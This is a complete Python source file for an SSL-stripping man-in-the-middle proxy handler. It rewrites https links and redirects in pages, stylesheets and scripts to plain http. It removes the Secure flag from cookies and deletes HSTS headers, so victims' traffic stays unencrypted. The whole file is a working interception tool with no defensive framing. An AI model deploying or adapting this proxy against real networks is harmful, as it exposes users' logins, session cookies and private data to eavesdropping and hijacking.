#!/usr/bin/env python

from SimpleHTTPProxy import SimpleHTTPProxyHandler, test
from urlparse import urlsplit
import re

class SSLStripProxyHandler(SimpleHTTPProxyHandler):
    forward_table = {}

    def request_handler(self, req, body):
        # forward known https urls
        if req.path in self.forward_table:
            req.path = self.forward_table[req.path]

    def response_handler(self, req, res, body):
        replaced_body = self.ssl_response_handler(req, res, body)
        if replaced_body is True:
            return True
        elif replaced_body is not None:
            body = replaced_body

        # strip secure cookies
        set_cookie = res.headers.get('Set-Cookie')
        if set_cookie:
            res.headers['Set-Cookie'] = re.sub(r';\s*Secure', '', set_cookie, flags=re.IGNORECASE)

        # prevent new "HTTP Strict Transport Security" policies [RFC 6797]
        del res.headers['Strict-Transport-Security']

        # replace https urls to http ones
        location = res.headers.get('Location', '')
        if location.startswith('https://'):
            http_url = re.sub(r'^https://', 'http://', location)
            self.forward_table[http_url] = location
            res.headers['Location'] = http_url

        content_type = res.headers.get('Content-Type', '')
        if content_type.startswith('text/html') or content_type.startswith('text/css') or content_type.startswith('text/javascript'):
            re_url = r'((["\'])\s*)https://([\w\-.~%!$&\'()*+,;=:@/?#]+)(\s*\2)'    # based on RFC 3986
            def replace_method(m):
                raw_path = m.group(3).replace('&amp;', '&')
                self.forward_table['http://' + raw_path] = 'https://' + raw_path
                return '%shttp://%s%s' % (m.group(1), m.group(3), m.group(4))
            body = re.sub(re_url, replace_method, body)

        return body

    def ssl_response_handler(self, req, res, body):
        # override here
        # return True if you sent the response here and the proxy should not connect to the upstream server
        # return replaced body (other than None and True) if you did
        pass


if __name__ == '__main__':
    test(HandlerClass=SSLStripProxyHandler)
